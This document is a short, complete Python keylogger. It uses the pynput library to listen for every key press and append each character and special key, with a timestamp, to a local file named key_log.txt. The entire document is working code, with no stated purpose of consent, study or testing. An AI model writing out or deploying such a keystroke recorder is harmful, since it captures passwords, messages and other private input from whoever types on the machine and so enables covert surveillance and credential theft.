from pynput import keyboard
import logging

# Set the path for the log file
log_file = "key_log.txt"

# Configure logging
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to handle key presses
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
